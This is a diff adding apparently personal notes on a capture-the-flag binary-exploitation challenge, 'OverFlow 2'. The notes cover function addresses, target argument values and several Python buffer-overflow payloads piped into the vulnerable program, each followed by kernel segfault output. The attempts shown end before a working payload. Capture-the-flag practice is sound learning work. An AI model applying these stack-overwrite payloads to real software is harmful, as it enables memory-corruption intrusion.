@@ -1,0 +1,53 @@
+OverFlow 2: Binary Exploitation
+
+Now try overwriting arguments. Can you get the flag from this program?
+You can find it in /problems/overflow-2_2_47d6bbdfb1ccd0d65a76e6cbe0935b0f on the shell server. Source.
+
+----------------------------------------
+
+#define BUFSIZE 176
+#define FLAGSIZE 64
+
+if (arg1 != 0xDEADBEEF)
+    return;
+if (arg2 != 0xC0DED00D)
+    return;
+
+
+* disassemble:
+
+080485e6 <flag>:
+...
+08048676 <vuln>:
+...
+080486b5 <main>:
+...
+
+
+* need input like:
+
+buffer + address + arg1 + arg2
+
+
+* trial and error
+
+python 'print "a"*176 + "b"*8' | ./vuln
+
+Segmentation fault (core dumped)
+
+????
+
+local running and use dmesg
+
+python -c 'print "a"*176 +  "\xe6\x85\x04\x08" + "\xef\xbe\xad\xde" + "\x0d\xd0\xde\xc0"' | ./vuln
+[21838.153546] traps: v[20794] trap invalid opcode ip:8048700 sp:ffcd4030 error:0 in v[8048000+1000]
+
+
+python -c 'print "a"*180 +  "\xe6\x85\x04\x08" + "\xef\xbe\xad\xde" + "\x0d\xd0\xde\xc0"' | ./vuln
+[22019.513828] v[20856]: segfault at c0ded00d ip 00000000c0ded00d sp 00000000ffcabe20 error 14
+
+
+python -c 'print "a"*188 +  "\xe6\x85\x04\x08" + "\xef\xbe\xad\xde" + "\x0d\xd0\xde\xc0"' | ./vuln
+[22837.181091] vuln[21305]: segfault at deadbeef ip 00000000deadbeef sp 00000000ffe12d94 error 14
+
+
